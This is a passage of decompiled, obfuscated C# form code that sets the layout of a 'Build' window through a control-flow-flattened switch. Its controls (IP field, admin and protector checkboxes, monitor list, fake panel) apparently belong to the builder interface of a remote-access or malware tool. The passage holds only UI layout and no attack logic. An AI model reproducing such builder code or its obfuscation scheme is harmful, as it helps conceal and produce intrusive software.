            ((Build) this).checkprotector.Size = new Size(168, 34);
            num1 = (int) num2 * -608386533 ^ 162624037;
            continue;
          case 1265:
            ((Build) this).logbtntext.FillColor = Color.FromArgb(0, 39, 81);
            ((Build) this).logbtntext.Font = new Font(EXGuarder.\u00339780D77, 16f);
            ((Build) this).logbtntext.ForeColor = Color.White;
            num1 = (int) num2 * -545054595 ^ 916541189;
            continue;
          case 1266:
            ((Build) this).Panel9.Controls.Add((Control) ((Build) this).comboproms);
            num1 = (int) num2 * -859732854 ^ -338714648;
            continue;
          case 1267:
            ((Build) this).Label47 = new Label();
            ((Build) this).Label46 = new Label();
            num1 = (int) num2 * -1551476209 ^ -1711921662;
            continue;
          case 1268:
            ((Build) this).Panel10.Controls.Add((Control) ((Build) this).Label18);
            num1 = (int) num2 * -317036256 ^ 949389594;
            continue;
          case 1269:
            ((Build) this).CheckAOX.ForeColor = Color.White;
            ((Build) this).CheckAOX.Location = new Point(83, 448);
            ((Build) this).CheckAOX.Name = EXGuarder.\u003214A1347;
            ((Build) this).CheckAOX.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num2 * 2057469046 ^ 447203087;
            continue;
          case 1270:
            ((Build) this).fakepanel.TabIndex = 40;
            num1 = (int) num2 * 210052279 ^ 1074407740;
            continue;
          case 1271:
            ((Build) this).Label14.BackColor = Color.Transparent;
            ((Build) this).Label14.Font = new Font(EXGuarder.\u00339780D77, 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            ((Build) this).Label14.ForeColor = Color.FromArgb(65, 177, 225);
            ((Build) this).Label14.Location = new Point(55, 305);
            num1 = (int) num2 * 1800347724 ^ -1568473263;
            continue;
          case 1272:
            ((Build) this).PictureBox1.Name = EXGuarder.\u0035C295346;
            num1 = (int) num2 * -647314724 ^ 1543126482;
            continue;
          case 1273:
            ((Build) this).combotype.ForeColor = Color.White;
            num1 = (int) num2 * 1154503318 ^ 1620788777;
            continue;
          case 1274:
            ((Build) this).panemnitor.Controls.Add((Control) ((Build) this).addmintor);
            ((Build) this).panemnitor.Controls.Add((Control) ((Build) this).listmonitor);
            num1 = (int) num2 * -156061608 ^ -1735163094;
            continue;
          case 1275:
            ((Build) this).TabPage13.ResumeLayout(false);
            ((Build) this).Panel7.ResumeLayout(false);
            num1 = (int) num2 * 1160407704 ^ -1824313011;
            continue;
          case 1276:
            ((Build) this).Panel5.ResumeLayout(false);
            ((Build) this).Panel5.PerformLayout();
            ((ISupportInitialize) ((Build) this).cusomupdateimg).EndInit();
            num1 = (int) num2 * -1641686234 ^ -1118006694;
            continue;
          case 1277:
            ((Build) this).checkemo.ForeColor = Color.White;
            num1 = (int) num2 * 128672544 ^ 1935952310;
            continue;
          case 1278:
            ((Build) this).po.TextAlignment = ContentAlignment.TopCenter;
            num1 = (int) num2 * 1501483190 ^ 1597566162;
            continue;
          case 1279:
            ((Build) this).Label20.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * -1672860917 ^ 1379264723;
            continue;
          case 1280:
            ((Build) this).Panel9.Controls.Add((Control) ((Build) this).addactiv);
            num1 = (int) num2 * 816893443 ^ -617751559;
            continue;
          case 1281:
            ((Build) this).Label26.Font = new Font(EXGuarder.\u00339780D77, 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            ((Build) this).Label26.ForeColor = Color.FromArgb(65, 177, 225);
            ((Build) this).Label26.Location = new Point(57, 147);
            num1 = (int) num2 * -456041955 ^ 158497378;
            continue;
          case 1282:
            ((Build) this).TABCTRL.ResumeLayout(false);
            ((Build) this).TabPage10.ResumeLayout(false);
            num1 = (int) num2 * -1096217083 ^ -287729539;
            continue;
          case 1283:
            ((Build) this).Label31.Font = new Font(EXGuarder.\u00339780D77, 15f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            ((Build) this).Label31.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Build) this).Label31.Location = new Point(88, 336);
            num1 = (int) num2 * -1185771091 ^ -1320128188;
            continue;
          case 1284:
            ((Build) this).randomidbtn.FillColor = Color.Transparent;
            num1 = (int) num2 * -1799530064 ^ 1079741310;
            continue;
          case 1285:
            ((Build) this).Label29.Name = EXGuarder.\u00374483B23;
            ((Build) this).Label29.Size = new Size(62, 24);
            num1 = (int) num2 * -802050043 ^ -1455147163;
            continue;
          case 1286:
            ((Build) this).trgtbkg.Minimum = (double) int.MinValue;
            ((Build) this).trgtbkg.Name = EXGuarder.\u00361681C1A;
            num1 = (int) num2 * -874292599 ^ 1609214731;
            continue;
          case 1287:
            ((Build) this).Label22 = new Label();
            ((Build) this).Label21 = new Label();
            num1 = (int) num2 * 143228414 ^ -478123275;
            continue;
          case 1288:
            ((Build) this).explaintoolstext.Dock = DockStyle.Bottom;
            num1 = (int) num2 * 982789636 ^ 1881911549;
            continue;
          case 1289:
            ((Build) this).Label38 = new Label();
            ((Build) this).checkadmin = new DrakeUICheckBox();
            num1 = (int) num2 * 991526499 ^ 804591326;
            continue;
          case 1290:
            ((Build) this).TextSize.Text = EXGuarder.\u0031A682E05;
            ((Build) this).TextSize.TextAlign = HorizontalAlignment.Center;
            num1 = (int) num2 * -212287008 ^ 1372018144;
            continue;
          case 1291:
            ((Build) this).dscriptext.Text = EXGuarder.\u0033C645D2D;
            ((Build) this).Label29.AutoSize = true;
            num1 = (int) num2 * 715121227 ^ 2103007053;
            continue;
          case 1292:
            ((Build) this).explainmonitortext.ForeColor = SystemColors.GradientActiveCaption;
            ((Build) this).explainmonitortext.Location = new Point(0, 0);
            num1 = (int) num2 * 1546247943 ^ 72349453;
            continue;
          case 1293:
            ((Build) this).TextIP.Minimum = (double) int.MinValue;
            num1 = (int) num2 * 1030897631 ^ 2016204278;
            continue;
          default:
            goto label_1296;
        }
      }
label_3:
      return;
label_1296:;
    }
  }
}
